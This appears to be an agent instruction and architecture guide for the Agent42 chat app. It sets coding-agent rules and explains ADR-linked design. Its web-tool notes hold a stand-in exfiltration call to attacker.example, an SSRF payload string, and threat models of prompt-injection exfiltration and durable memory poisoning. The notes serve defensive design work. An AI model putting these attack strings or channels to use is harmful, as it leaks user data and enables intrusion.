# Agent42

> Personal AI chat agent ("Agent 42"): Orleans-hosted conversations wrapping Microsoft
> Agent Framework agents on Azure OpenAI, with a static web UI, deployed to Azure Container Apps.

**Stack:** .NET 10 · Orleans 10.2 (grains, Cosmos persistence + reminders) · Microsoft Agent
Framework 1.19 · ASP.NET Core minimal APIs · Aspire 13.5 (local orchestration) · vanilla-JS
frontend in `wwwroot/` · Bicep + GitHub Actions → Azure Container Apps

## Commands

| Task | Command |
|------|---------|
| Install | `dotnet restore Agent42.slnx` |
| Run dev (offline) | `dotnet run --project tools/Agent42.DevHost` — canned LLM, in-memory grains; UI at http://localhost:61326 |
| Run full stack | `dotnet run --project src/Agent42.AppHost` — Aspire + Cosmos emulator (needs Docker) |
| Test | `dotnet test Agent42.slnx` |
| Lint | `dotnet format Agent42.slnx --verify-no-changes` |
| Type check | `dotnet build Agent42.slnx` |

## Hard rules

1. **Never commit or push to a protected branch.** The list lives in ONE place —
   `branches.protected` in `.agentic/quality-gates.yaml` — and is enforced from there
   by the agent hook (`.claude/hooks/protect-main.mjs`) and the human hook (`lefthook.yml`).
   Always a branch (`feature/*`, `fix/*`, `hotfix/*`) + MR.
2. **Code is the source of truth.** Docs in this repo are pointers and rationale, never
   authority on structure. On conflict, trust code and fix the doc in the same MR.
3. **Quality gates** live in `.agentic/quality-gates.yaml` — read them, never hardcode
   thresholds. Tests are written alongside implementation, never deferred.
   **Every gate there must name a measuring tool in this repo (ADR 0050)** — a threshold
   nothing measures cannot fail, so it is not a gate. Adding one without tooling fails
   `QualityGateTests`. Never estimate an "Actual" value to fill a gate table; report
   SKIPPED and fix the gate.
4. **Dependency versions are resolved, never recalled.** When adding a package, never
   write a version number from memory — let the tooling resolve the latest stable
   (`dotnet add package X`, `npm install X@latest`) and pin it where the repo pins
   versions (e.g. `Directory.Packages.props` under Central Package Management).
5. **Azure RBAC changes are never executed by the agent.** Prepare the exact
   `az role assignment` / `az rest` command and hand it to the user to run.

## Where knowledge lives

| What | Where | When to use |
|------|-------|-------------|
| Decisions + rationale | `.agentic/decisions/` (ADRs) | Before proposing any architectural change, grep here for prior art and supersessions |
| Non-obvious constraints | `.agentic/gotchas.md` | Read the entries for your area before changing it |
| Canonical code shapes | Exemplar paths listed in `.agentic/gotchas.md` | Copy the exemplar's shape for new code; never invent structure |
| Multi-session plans | `.agentic/specs/` | Active plans; move to `specs/completed/` when done |

## Working agreement (the loop)

**Choosing a workflow:** nontrivial change → `/plan`, then `/execute-plan` (per-step
test gating) — each in a fresh session (`/clear`); the spec in `.agentic/specs/` is
the complete handoff between them. Small urgent fixes go direct — minimal diff,
regression test mandatory, always a `fix/*` or `hotfix/*` branch. Run `/audit-docs`
periodically and after large refactors.

**Before a change:** read `gotchas.md` entries for the touched area → open the relevant
exemplar file → validate assumptions with search, not memory.

**After a change:** made a decision with alternatives? → `/decide`. Hit a trap the code
can't express? → `/gotcha`. Diff invalidates a doc claim? → fix it in the same MR
(`/sync-docs`). Then run test + lint before reporting completion.

**Parallel subagents:** for read-only fan-out (verifying claims, locating shapes,
mining history) dispatch `scout` subagents (`.claude/agents/scout.md` — cheap model
tier, evidence-or-unverified discipline) and keep judgment in the main session.
Dispatching two or more write-capable subagents concurrently requires worktree
isolation (`isolation: "worktree"`) — or run them sequentially. Parallel writers
in one checkout corrupt each other's edits. For plan steps, dispatch
`step-implementer` subagents (`.claude/agents/step-implementer.md`) — they carry
the per-step discipline; plain subagents don't.

**Convention enforcement:** conventions here are enforced by tooling
(`dotnet format` whitespace/IDE analyzers — checked in CI; lefthook pre-push +
`.claude/hooks/protect-main.mjs` for branch protection; **`SonarAnalyzer.CSharp` for
cognitive complexity, and exactly that one rule** — ADR 0050). If you find yourself about
to document a mechanical rule, add a lint rule instead.

## Repo-specific notes

- Personal/experimental project (Peter Bons). It now has ONE external consumer surface, and only one:
  the `Hindsight.AgentFramework.Net` package published from
  https://github.com/Expecho/Hindsight.AgentFramework.Net (ADR 0056). What is owned is that package's
  public API and its issue tracker; Agent42's own internals stay private and freely breakable.
- Deploy: push to `main` → `.github/workflows/deploy.yml` → ACR `crexpechohosting`,
  Bicep to RG `rg-agent42`; app is behind Entra ID Easy Auth at chat.agent42.nl.
- The AI Foundry account `Agent42` lives in a *different* RG (`agent42`); the deploy
  SP only holds role-assignment rights there — see gotchas before touching IAM/infra.
- Image attachments live in an Azure Storage account (private `attachments` container,
  provisioned in `infra/modules/storage.bicep`); bytes stay out of the 2 MB Cosmos session
  item (ADR 0004). Its Storage Blob Data Contributor grant is now in Bicep
  (`infra/modules/storage-role-assignment.bicep`), which works only because the deploy SP holds
  RBAC Administrator on `rg-agent42` (a one-time manual elevation — see gotchas). The OpenAI managed-identity
  grant is **no longer required** (ADR 0017 — Foundry chat/embeddings authenticate by API key); leaving any
  existing grant is harmless.
- Document RAG (ADR 0007 + 0008): uploaded documents (PDF/Office/text) are **ingest-only** — extracted,
  chunked, embedded (`text-embedding-3-large`) and stored in a Cosmos NoSQL **vector** container
  (`doc-chunks`), retrieved by an **always-on `TextSearchProvider`** (Agent Framework) that auto-injects
  the top excerpts before each reply — attached only when the conversation has an ingested document
  (ADR 0008 replaced the earlier agentic search tool); they never become chat
  attachments (off the image `UriContent` path). **The embedding model is per-user (ADR 0030), not an
  operator prerequisite:** a user declares an embedding model on a provider (`SupportsEmbeddings` opt-in) and
  picks it as the **default embedding model** in Preferences (`PUT /api/default-embedding-model`); ingestion
  and retrieval resolve it via **`IChatClientFactory.GetEmbeddingGenerator()`** (mirrors ADR 0020 image gen —
  no new interface/host registration). With none configured the composer **blocks attaching documents** (images
  still allowed) and retrieval **degrades to empty — never throws**. The vector model must produce **3072-dim**
  vectors (ingest **validates-and-rejects** a mismatch); changing the embedding model is **delete-to-reingest**.
  `AzureOpenAI:ApiKey`/`EmbeddingDeploymentName` and the `AZURE_OPENAI_API_KEY` secret are **gone** (0030 removed
  the last operator floor 0019 kept; `AzureOpenAI:Endpoint`/`ApiKey` survive only as the dormant Foundry-inheritance
  source, `TenantId` still binds `DefaultAzureCredential`). The Cosmos vector path is prod-only (offline/AppHost
  use an in-memory index). See gotchas before touching the vector container or embedding config.
- Web search (ADR 0011): two model-invoked tools — `web_search` and `fetch_web_page` — over a
  **self-hosted SearXNG sidecar** in the backend's Container App, reached over `localhost:8888`
  (8080 is the backend's own ingress). Agent Framework's `HostedWebSearchTool` does **not** work
  here: our client is Chat Completions, which rejects `web_search_options` with HTTP 400 (that is
  what `f14de0e`/`81b2f93` were about). The sidecar image is `infra/searxng/` (thin image over a
  pinned upstream tag, config baked in). Self-hosted ≠ private: SearXNG is a *meta*search engine and
  forwards every query to Google/DuckDuckGo/Bing — what it buys is no API key, no bill, no per-user
  attribution. **ADR 0060 is required reading before touching the engine list:** `keep_only` FILTERS the
  upstream engines, it enables nothing, so for the whole life of this feature DuckDuckGo was the only
  engine that answered — which is why `web_search` was returning empty lists. Google shipped upstream as
  `inactive: true` (skipped by `load_engines` outright — invisible in `/config` AND in
  `unresponsive_engines`, and **unfixable from `settings.yml`**; only the image bump to
  `2026.8.29-d226b78bc` reached it) and Bing as `disabled: true` (loaded but never queried — that one an
  `engines:` override does fix). `/config` is the only honest way to see which engines **loaded**;
  `unresponsive_engines` and the ADR 0059 UI are how you see which ones **answered**. Reading the yaml
  tells you neither.
  A **`SEARXNG_SECRET` GitHub Actions secret is a manual prerequisite** (any long random
  string): the sidecar won't start without it, and since ACA gates revision health on *every*
  container in the replica, a crash-looping sidecar takes the **backend** down too. Three things to
  read before touching this: a tool's *return value* is persisted into the 2 MB session;
  `fetch_web_page`'s allowlist is a prompt-injection exfiltration control (it pins whole URLs, not
  hosts — a host allowlist is bypassable); and a named `HttpClient` silently inherits
  `AddServiceDefaults`' retry pipeline. All three are in gotchas.
- SearXNG's web UI, proxied behind Easy Auth (ADR 0059, **amends 0011**): the sidecar's own HTML search
  UI is served at **`/searxng/{**path}`** — the **first non-`/api` routes** in `MapAgentApi` — linked from
  Preferences → Configuration, so an empty or odd `web_search` result can be explained (which engines
  answered, which failed) instead of the sidecar being a black box. **ADR 0011's "unreachable from
  outside by construction" is RETIRED**; its other half is not — one ingress, port 8888 still unpublished,
  **no `excludedPaths` entry**, ADR 0002 unweakened. Frontend/backend only: no new secret, Cosmos
  container, Dockerfile change, Bicep ingress change or mandatory DI registration (`IServiceProvider` +
  `GetService`, the `/api/speech` pattern, which is also what makes DevHost's curated 503 free).
  `SEARXNG_BASE_URL` gains the `/searxng/` subpath, which — measured — makes every generated asset URL
  root-relative and already prefixed, so **no markup is rewritten**; the sidecar still answers on `/`, so
  `web_search` is untouched. **The headline consequence is a direction that nearly got missed: the
  proxied page runs on OUR origin**, where it could otherwise read ADR 0032's unencrypted IndexedDB
  conversation mirror and call any `/api/*` with the ambient Easy Auth cookie (ADR 0054's traces, ADR
  0035's share minting). Hence a CSP on every response — **and it takes BOTH halves**:
  `sandbox allow-scripts allow-forms` (omitting `allow-same-origin` forces an opaque origin) stops every
  *read*, but a sandboxed page **can still POST a form same-origin with the session cookie** (measured),
  which alone mints a share link — so `form-action {scheme}://{host}/searxng/` is required, built
  per-request because **`form-action 'self'` is measurably useless** (it matches the URL's origin, not the
  opaque one). That makes this a second quiet dependency on ADR 0042's `UseForwardedHeaders`. Nothing
  observable is lost: the sandbox would break SearXNG's autocomplete, but `settings.yml` already ships
  `autocomplete: ""`. Four traps, all in gotchas: the outbound Easy Auth cookie / `X-MS-*` leak
  (fixed by **allowlists, never denylists**); that same-origin escalation and its CSP; that `/searxng/`
  matches the **literal** `/searxng` template, which **out-ranks the catch-all**, so a naive
  bare-prefix redirect loops forever on the canonical URL; and that the catch-all value is
  **percent-decoded**, making it an SSRF sink (`%2f%2fevil.example`) — with the redirect `Location` rule
  its mirror image, where an absolute value is *expected* and only a recognised authority is accepted.
  A **second** named client `searxng-ui` is required: `AllowAutoRedirect`/`UseCookies`/no-decompression
  each break a proxy and all three are shared with `web_search`. Shell cache bumped `agent42-shell-v24`
  → `-v25` (the SW needs a `/searxng` guard beside `/api`). Bumping the pinned upstream image is
  explicitly out of scope.
- Hosted page scrape (ADR 0027, **supersedes ADR 0011's SSRF-guard mechanism only**): `fetch_web_page`
  no longer dials the model's URL from our container — it calls the hosted **context.dev** scrape API,
  which returns clean markdown, and can **follow depth-1 links** whose text matches a model-supplied
  `followLinkFilter` (up to `WebToolLimits.MaxFollowedLinks`). Because the outbound request is context.dev's,
  the old `WebPageFetcher`/`AngleSharp` **SSRF sink is gone from THIS path** (deleted — but read the ADR 0066
  bullet: `PrivateAddressGuard` itself is back in the repo, for `read_web_document` only); the whole-URL
  **allowlist stays** (it is an exfiltration, not SSRF, control) and applies to the **root** URL only.
  **The headline consequences:** (1) every fetched URL and its content now transit a third party outside
  the Entra tenant (ADR 0013's egress shape); (2) followed links are **allowlist-exempt** — an accepted
  residual risk the ADR records honestly (opt-in, hard-capped, credit-billed, labelled untrusted, logged —
  none of which closes the channel). A **`CONTEXT_API_KEY` GitHub Actions secret is a manual prerequisite**,
  but deliberately **not on the availability path** (like `GOOGLE_MAPS_API_KEY`, not `SEARXNG_SECRET`): with
  no key the app starts and `fetch_web_page` fails per call. Read the two new gotchas (the two fetch paths
  and their different security models; following is an accepted residual risk) and note the return budget
  is now `MaxTotalPageTextLength` across root + followed, not `MaxPageTextLength` alone.
- Web-hosted documents into RAG (ADR 0066, **amends 0011 + 0027 + 0056, extends 0007/0008/0021**): a
  model-invoked **`read_web_document`** tool fetches a PDF/Office/text document **from our own container**,
  ingests it into the conversation's vector index (ADR 0007's pipeline, unchanged) and returns budget-capped
  excerpts for the current turn. **`fetch_web_page` and context.dev are untouched** — that disjointness is
  what lets this ship before the planned context.dev removal, and it leaves the restored guard behind for
  that work. **The headline is that ADR 0027's rejected "fallback direct fetch" alternative was deliberately
  re-adopted (the user was asked), so `PrivateAddressGuard` is back — verbatim, connect-time,
  DNS-self-resolving, IPv4-mapped/NAT64-aware — on this path ONLY.** There are now two fetch paths with two
  security models, an accepted cost; the gotcha carries both halves in one entry so neither is read alone.
  `AngleSharp`/`WebPageFetcher` are **not** restored (HTML is rejected here) and **no package is added**.
  Two design points that are not obvious: **`BuildAgent` decides the context providers before the run**, so
  a mid-run ingest cannot reach its own turn — hence the tool returns excerpts inline (taking a `question`),
  which is the `OnDemandFunctionCalling` shape **ADR 0008 rejected**, taken deliberately because it is
  *additive to* the always-on provider (**do not write "following ADR 0008"**); and the rebuild is deferred
  to **TWO consume sites** — `ChatCoreAsync` **and** `ReceiveReminder`, which does not drain it. Excerpts are
  ranked **in process** over the just-embedded chunks, never via `IDocumentIndex.SearchAsync` (prod-only
  Cosmos path, ADR 0007/0061's scar; and no per-document filter). Provenance is a security property: a
  trailing **`[Id(11)] WebDocumentNames`** keeps these out of the "the user has uploaded" sentence, the RAG
  gate becomes the **sum** of the two lists, and the URL-derived filename is hard-sanitized because it is
  prompt text — **and carries a `(web: {host})` qualifier built from the whole path, which is not
  cosmetic**: the always-on provider serves uploaded and web-fetched excerpts through the same
  `ChatRole.User` channel whose only per-excerpt metadata is `SourceName`, so without it a fetched
  `/handbook.pdf` cites identically to an uploaded one and collides with it. Re-reading a URL
  short-circuits before the fetch (chunk ids are fresh `Guid`s, so a second read **duplicates** chunks —
  and a repeating reminder can trigger this) and the name list is bounded oldest-first. Redirects **are**
  followed (5 hops, each address-guarded), so the bytes can come from a host the allowlist never saw —
  mitigated by naming the document after the **final** URI. **Three consequences worth carrying:** it is a **fourth and the largest** member of ADR 0056's
  durable-injection list, so the poisoning is **unbounded, not conversation-bounded** (no Hindsight delete
  path); **`/api/agent-run` reachability changed** — an `excludedPaths` API-key holder can now make our
  managed-identity-bearing container dial a URL of their choosing, which is exactly what the guard is for;
  and the new catalog key lands **OFF for anyone who ever pressed Save** (no migration, by design). Limits
  live in `WebDocumentLimits` (10 MB streamed cap, chunk cap, and a **separate download deadline** because
  `ResponseHeadersRead` makes `HttpClient.Timeout` stop covering the body). No new secret, container, Bicep
  or `excludedPaths` change; `POST /api/conversations/{id}/documents/from-url` is noted as a follow-up and
  deliberately **not built**.
- MCP tool results may seed the fetchable-URL allowlist (ADR 0067, **amends 0011 + 0066, extends 0024/0026**):
  a **per-server opt-in** — `StoredMcpServer.SeedsFetchableUrls`, trailing `[Id(13)]`, default false, so every
  existing server ships with it OFF and there is no migration — lets the URLs in that server's tool results
  become fetchable by `fetch_web_page` and readable by `read_web_document`, without the user pasting them
  back. The motivating case is the sibling repo's `find_links(url, filter)` → a PDF. **Three things about the
  security position, in the order they are got wrong.** (1) **Exfiltration through MCP is ALREADY open and
  this does not create it** — `BuildAgent` gates MCP tools by selection key only, never by argument, so
  `find_links("https://attacker.example/?q=<secret>")` was always possible (ADR 0024); do not write this up as
  opening a channel. (2) What it DOES add is **durable inbound poisoning with a laundering step**:
  attacker-authored hrefs become ingestible by `read_web_document`, which writes vector chunks and — through
  ADR 0056 — can be retained into a memory bank with **no delete path**. (3) The sharpest and most easily
  missed: **our own managed-identity-bearing container now dials attacker-authored URLs**, so this amends
  **ADR 0066's** threat model, not 0011's alone (0066 already recorded that an `excludedPaths` API-key holder
  could do it; this is a second, **model-facing** door), and `PrivateAddressGuard` is **no** substitute — it
  permits every public address by construction. "User-invoked" is not a distinguishable state and must not be
  designed around. The seeds go in a **separate** `[Id(13)] SeededFetchableUrls` with **two** caps
  (`MaxSeededUrlsPerResult = 20`, `MaxSeededFetchableUrls = 100`): harvesting into the 50-entry
  `FetchableUrls` would let one link-heavy scrape **silently evict every URL the user typed**, and without the
  per-result cap an 8 KB result (150–250 URLs) reproduces that defect one level down. **The split is not pure
  upside** — a poisoned seed is now *harder* to flush, since only other seeds evict it and there is no revoke
  path. The harvest lives in the **grain** (`UrlHarvestingMcpTool`, wrapped in `BuildAgent` via an extracted
  helper for S3776 headroom), never in the Backend's `TruncatingMcpTool`, because that wrapper's instances are
  shared across every conversation of a user while the lists are per-conversation. Four mechanics traps and the
  four-times-told prohibition are in gotchas; the headline one is that **the rule the model actually reads is in
  the TOOL DESCRIPTIONS** (six surfaces, in the JSON schema every turn), not `SKILL.md` — update only the skill
  and a compliant model declines to use a seeded URL while every test passes. The flag is a **setting**, so it
  rides `ToStored` and must **never** gain a `Keep` clause (the opposite of `KnownToolNames`) or it could not be
  turned off. No new secret, container, Cosmos container, Bicep or `excludedPaths` change, and no package.
  Shell cache bumped `agent42-shell-v32` → `-v33`. DevHost needed changes of its own to make the feature
  exercisable at all (a `demo_find_links` tool, the seeding flag on the offline group, and a two-call chain in
  `CannedChatClient`); the offline leg **was** run — including an A/B on the flag and a UI untick/re-tick
  round-trip — and ADR 0067 records the measured values.
- User location (ADR 0012): a `get_current_location` tool returning the user's coordinates and a
  reverse-geocoded street address. `navigator.geolocation` is a *browser* API and tools run server-side,
  and the chat path is a one-way NDJSON stream — so a tool cannot ask the browser for a fix mid-turn. The
  position therefore **rides the chat request** (`ChatRequest.Location` → `ChatAsync(…, location)`) into a
  **turn-scoped grain field that must be cleared explicitly** (it lives for the *activation*, not the call
  — see gotchas; that is the bug the reminder-path test exists to catch). A **`GOOGLE_MAPS_API_KEY` GitHub
  Actions secret is a manual prerequisite** — a Google Cloud key with the **Geocoding API** enabled and
  restricted to it — but unlike `SEARXNG_SECRET` it is deliberately **not on the availability path**: with
  no key the app starts normally and the tool reports coordinates without an address. Three things to read
  before touching this: the tool is **not** an SSRF sink and must not grow an SSRF address-guard (two
  narrow properties keep that true, and a test pins them); the browser's authorization gate is
  **two-legged** because WebKit/iOS has no geolocation Permissions API; and this feature puts the user's
  **street address** into a conversation that the ADR 0011 exfiltration channel can still drain — the
  `websearch` skill only *mitigates* that. All three are in gotchas.
- Model providers (ADR 0013, credential mechanism amended by ADR 0017, **baseline removed by ADR 0019**,
  **embedding floor removed by ADR 0030**):
  **Read this override first.** As of ADR 0019 the app ships **NO baseline chat provider** — `Models:Providers`
  is `{}`, chat is **entirely per-user** (ADR 0018), and there is **no operator default model**. So in the
  bullet below: "the default stays Foundry", "serves on Foundry alone", the baseline GitHub Models secret
  prerequisite and its wiring, the "blank Foundry key is **fatal** — Foundry is the availability path" rule, and the shipped
  `foundry` provider's `Discover:false`/`gpt-5.4`/`AzureOpenAI:DeploymentName` details are all **superseded** —
  and as of **ADR 0030** even the **embedding** floor is gone: there is now **no** operator model of any kind,
  `AzureOpenAI:ApiKey` is **no longer fatal** (blank boots), and the embedding model is a **user-added** model
  too (`SupportsEmbeddings` + a per-user default embedding model). A Foundry chat model is now something a
  **user** adds. A user with no provider gets an empty picker + gated
  composer; the grain stays valid via a no-op `NoModelChatClient`. The mechanism facts below still hold. A
  conversation can run on **any
  OpenAI-compatible endpoint**, not just Azure Foundry. The `Models:` config section maps provider keys to
  either an `AzureOpenAI` (Foundry) provider or an `OpenAICompatible` one — **both now reached with an API
  key** (ADR 0017 replaced Foundry's managed identity with an Azure OpenAI key). ~~**GitHub Models** is wired
  in prod~~ (ADR 0019: GitHub Models is now a **user-added** provider, not a baseline one); Ollama/vLLM work
  by config alone. A model is named by a **qualified `provider:model` id split on the FIRST colon**
  (GitHub's own ids contain a `/`); a bare id is legacy and resolves against the default provider, which
  is why this needed no state migration. ~~A GitHub Actions secret for the baseline GitHub Models provider
  was a manual prerequisite~~ (ADR 0019 removed the baseline `github` provider **and** its operator-level
  token wiring — a user supplies their own PAT per-provider now). **The
  headline consequence: picking a third-party model sends the conversation
  — document excerpts, image SAS URLs, the user's street address — outside the Entra tenant.** That is why
  the default stays Foundry and the pick is explicit. Four things to read before touching this: the
  first-colon split and why `DeploymentName` keeps its name; `AgentSkillsProvider` is a **tool** (a
  no-tools model must drop it, while the RAG provider must stay); the vision gate must cover **history**,
  not just the new turn, or old image SAS URLs still leak; and the Foundry provider's endpoint, **API key**
  and ARM coordinates are **inherited** from `AzureOpenAI:*`, never copied. All four are in gotchas — along
  with the measured GitHub caps (16k/8k input tokens, failing with an **HTTP 413**, not a 400). **ADR 0017
  changes for Foundry:** it authenticates by Azure OpenAI **API key** (a blank one is **fatal** — Foundry is
  the availability path, unlike a third-party key), ARM **discovery is off** (a data-plane key can't reach
  ARM, so the provider **declares** its deployments), and the default deployment is **`gpt-5.4`** (`gpt-4o`
  is not deployed in the account).
- User-configurable providers (ADR 0018, amends 0013 + 0017; **availability floor removed by ADR 0019**):
  a signed-in user adds/edits/deletes their own
  model providers — **including Foundry** — from the web UI (Preferences → model providers), per-user, with
  API keys persisted **encrypted**, and changes taking effect **without a restart**. The model is
  **baseline ⊕ per-user overlay**, but as of ADR 0019 the **baseline chat set ships EMPTY**, so chat is
  effectively the overlay alone (a provider must declare **≥1 model**; the resolver's effective default is a
  valid overlay default → the first declared model → `""`). ~~the env/`appsettings` set stays the boot-time
  **availability floor**~~ (only the **embedding** key is a floor now); a `UserProviderConfigGrain` holds the
  overlay, and `UserProviderResolver` merges them — reused by both a per-user chat-client factory (resolved
  on `AgentGrain` activation, cached by overlay **version**) and a per-user `/api/models` catalog. **A user
  override that resolves invalid falls back to baseline — overlays are best-effort, never fatal.** The
  headline consequence is 0013's, now reachable from an endpoint the **user** added: picking a third-party
  model still sends the conversation outside the Entra tenant, so the default stays Foundry. **A
  `dataprotection` blob container is a new prerequisite** (added to `storage.bicep`; the app MI already holds
  the grant). Traps to read before touching this: the overlay is best-effort / baseline wins (and user
  providers do **not** inherit `AzureOpenAI:*`) — and, in the same gotcha, a user endpoint is deliberately
  **not** SSRF-guarded (config, not a model/request — so `localhost` is accepted); secrets are DP-encrypted,
  never echoed, and the DP key ring **must persist** out-of-process in prod (else a restart orphans every
  secret); the per-user factory is resolved on activation **before** its first use, not injected (and every
  grain host must register `IUserChatClientFactoryProvider`). All are in gotchas. Offline (DevHost/tests) uses
  single-user adapters, so the providers **CRUD/UI** is exercisable there but overlay→picker reflection is
  only wired in prod (unit-tested via `UserModelCatalogTests`). The overlay `Default` is now **user-settable**
  from the same tab (a select above the provider list) via **`PUT /api/default-model`** — a distinct path, not
  `/api/providers/default`, because a provider key is user-chosen and the literal segment would out-rank
  `{key}`; the read side stays on `GET /api/providers` (`ProvidersResponse.Default`). The submitted id is
  **not** validated against the catalog (the resolver's read-time `NamesBuiltProvider` guard is the single
  place that rule lives; the 200-char cap only keeps unbounded text out of grain state), and **"New chat"
  resets the composer picker to it**. Separately — and whether or not the composer is involved — changing the
  default **retargets every conversation that has not yet bound a model**, because `AgentGrain` binds to
  `_chatClientFactory.DefaultModelId`; that reaches `/api/agent-run` runs and pending reminders, which never
  touch the composer at all. It is bounded: the first turn calls `RebindModelAsync` and pins the model.
- Responses API on Foundry (ADR 0014; credential mechanism amended by ADR 0017): a provider-level
  `UseResponsesApi` flag routes **every** model of a Foundry provider through the OpenAI **Responses** API run
  **statelessly** (`store=false`) instead of Chat Completions — reached with **no package change** via the
  stable `OpenAI 2.12.0` client pointed at `{endpoint}/openai/v1` with an **`api-key`-header** policy carrying
  the Azure OpenAI key (ADR 0017 replaced ADR 0014's managed-identity bearer policy; the resource key
  authenticates `/openai/v1` via the `api-key` header — spike-confirmed 2026-07-16). It ships **on** in prod
  (`appsettings.json` sets `UseResponsesApi: true`; turning it off reverts to Chat Completions + SearXNG) and
  is a server-side transport choice, **not** user-selectable. Stateless is **mandatory** — the grain holds all
  history client-side (ADR 0004) — so the build uses `AsIChatClientWithStoredOutputDisabled`, and
  `includeReasoningEncryptedContent` is forced **`false`** (its `true` default 400s non-reasoning models like
  the default `gpt-5.4`). Read the "Responses API is stateful by default" gotcha before touching
  `Provider.Foundry`.
- Hosted tools on the Responses path (ADR 0015): a Responses Foundry model reaches OpenAI's **native**
  server-side `web_search` + `code_interpreter` (Chat Completions 400s on them — the reason the SearXNG
  sidecar exists, ADR 0011). The signal is a new `ModelCapabilities.SupportsHostedTools` bit (true only when
  the provider runs Responses); `AgentGrain.BuildAgent` then **swaps** — dropping the SearXNG
  `web_search`/`fetch_web_page` shims and registering `HostedWebSearchTool` + `HostedCodeInterpreterTool`.
  It's a swap, not an add, because `HostedWebSearchTool.Name` is literally `web_search` and would collide
  with the shim (see that gotcha). SearXNG stays for every Chat model, so it is **not** retired here.
- Per-agent history mode (ADR 0016): a stored agent carries a `Continuous` flag (trailing `[Id(7)]` on
  `AgentDefinition`, default `false`). Per-chat (default) mints a fresh `crypto.randomUUID()` per start, as
  before; **continuous** derives a **deterministic** conversation id `` `agent-${agent.id}` `` in the client, so
  every start collapses onto the one grain `{userId}/agent-{agentId}` and shares one ongoing history (a
  re-entry resumes it via `selectConversation`, not a blank thread). The flag is read **client-side and never
  snapshotted into `AgentBinding`** — it's routing, not persona — so a user can flip it for *future* starts
  without disturbing existing chats (ADR 0003), but the flip is inert on a continuous agent's already-bound
  grain. Trailing default = no migration. **The headline consequence: continuous funnels every chat into one
  unbounded grain, so it will eventually hit the 2 MB session cap (ADR 0004) and brick the conversation in
  prod — `DELETE /api/conversations/agent-{agentId}` (delete-to-reset) is the only escape hatch.** See gotchas.
  **ADR 0068 NARROWS that, and does not close it** (0016's "no code mitigation is in scope" is the one
  sentence it reverses; everything else in 0016 stands, flag included): messages older than a fixed **24 h**
  are **hard-deleted** from a continuous chat's session on **every persisted turn**, whole user turns at a
  time, off the front. A window bounds **age**, not **size** — one oversized tool return still bricks inside
  the day. Detection is the **id shape** (`agent-` prefix), which is why 0016 needs no reversal. **No new
  `[Id(n)]`, no migration:** the timestamps ride on the messages inside `SerializedSession`, which round-trips
  them — but the grain must **stamp** them itself (measured: neither run path sets `CreatedAt`, and the
  streaming coalescer drops even a provider-supplied one), under a **clamp** rather than a `??=`, because on
  the `RunAsync` reminder path a provider value **is** preserved and an epoch would delete a live turn. A
  `TimeProvider` seam exists purely so the window is testable; it is an **optional ctor parameter**
  (`ActivatorUtilities` honours defaults — verified), so this is deliberately **not** another "every grain
  host must register X" — the three hosts are untouched. **Only continuous chats are STAMPED, not just
  pruned** — the gate is in `ApplyRetentionAsync` above the stamp, because `createdAt` costs ~35 bytes a
  message (~1.2% of the 2 MB item, measured) that a never-pruned chat would never read. Three things to
  read before touching it: the two new gotchas — remap `_ephemeralOrdinals`, never `Clear()`, **and never
  in the wrong frame** (the remap belongs in `PruneExpiredTurnsAsync` where the shift happens; deferring it
  to a retryable reconcile double-shifts and **indexes incognito text** — measured, and it is why the retry
  state is a bare bool); and the projected-vs-user-turn delta plus the one index delete `ReindexAsync`
  cannot repair (**not** self-healing across a deactivation). Also: pruning **loses content from a public
  share link** (ADR 0035), leaves ADR 0032's IndexedDB mirror stale, and does **not** reach text already
  sent to Hindsight (ADR 0056, no delete path) or sitting in ADR 0054's `/logs`. Two bounds — the
  `TurnAttachments.RemoveRange` clamp and `MinimumPreservedTurns` — were planned as bug fixes and
  **measured to be defensive only**; both say so in the code rather than implying coverage that is not
  there.
- Image generation (ADR 0020): a new per-model capability bit `SupportsImageGeneration`, declared on an
  OpenAI-compatible model (a user-added provider, ADR 0018), makes a picked model **produce an image
  instead of a chat reply** — text-to-image, or image-to-image (edit) against this turn's attachment, else
  the most recent image in the conversation. It is a **dedicated model, not a tool** the text model calls.
  Generated images reuse the `attachments` blob container on the **assistant** side (extends ADR 0004 —
  **no new container/Bicep**) and re-appear on reload. Four things to read before touching this: image gen
  runs a **different API** (`IImageGenerationService` over the SDK `ImageClient`, not the chat client) via an
  **adapter run** (`ImageGenerationChatClient`) because AF 1.13 has no append-without-inference; the assistant
  image is **id-keyed** (message-level `assistantImageId`), never joined by assistant-message position (they
  are not 1:1 with turns); the branch runs **before** the vision gate (an image model *consumes* images); and
  the interface is **`IImageGenerationService`** because M.E.AI 1.13 ships a colliding `IImageGenerator`. All
  in the "assistant generated image is id-keyed" gotcha. **Headline consequence:** generating sends the prompt
  — and for edits the **input image bytes** — outside the Entra tenant (extends ADR 0013's egress).
- Selectable tools (ADR 0021, **the skills key amended by ADR 0048, memory added by ADR 0057**): a user chooses **which tools** an
  assistant may use, remembered at three
  layers — a **user default** (Preferences → default tools, every new regular chat), a **per-conversation
  override** (composer "Tools" popover, non-agent chats only), and a **per-agent** set (agent editor,
  snapshotted into the conversation like ADR 0003). The selectable set is a curated catalog of **keys**
  (`ToolCatalog`, the single source of truth for the **static** ones, exposed via `GET /api/tools`):
  `web_search`, `location`, `scheduling`, `code_interpreter`, `memory` (ADR 0057);
  `get_date` and document RAG stay always-on.
  **`skills` is no longer among them** — since ADR 0048 it is a **wildcard** (in `AllSelectableToolKeys`,
  **not** in `Descriptors`) and the picker renders one `skill:{name}` box per shipped skill, exactly as ADR
  0026 did to `mcp`. `EnabledTools`
  is a nullable list of keys on `UserProfile`/`AgentDefinition`/`AgentBinding`/`AgentGrainState` where
  **`null == all`** (no migration); the grain resolves **override ?? user-default ?? all** and then
  **intersects with model capability** — selection can only *narrow*, never grant (a text-only model still
  gets none; `code_interpreter` still needs a hosted model). **`memory` is the ONE documented exception to
  that intersection** (ADR 0057): it gates an `AIContextProvider`, not a tool, so it never passes through
  the capability filter — a text-only model with `memory` selected still gets memory — and it is the first
  key in `Descriptors` with **no** `ToolNameToKey` entry. Like `calendar` before it (a key ADR 0063 has
  since removed entirely), `memory` lands **OFF
  for anyone who ever pressed Save** (a stored selection is an explicit list), with **no migration** by
  design, so after deploying press Save once in Preferences → Tools — and on **agent** chats there is no
  in-UI remedy at all (the bind snapshot is immutable and the popover is hidden), which is accepted and
  documented. Two more things to read before touching this: the
  `null == all` sentinel and the **user-default-fetch-before-first-`BuildAgent`** ordering hazard (both in
  the "Selectable tools" gotcha); and that a selection resolving to **zero skills** must **drop the
  `AgentSkillsProvider`** (it is a tool), while RAG must stay (the "`AgentSkillsProvider` is a TOOL" gotcha).
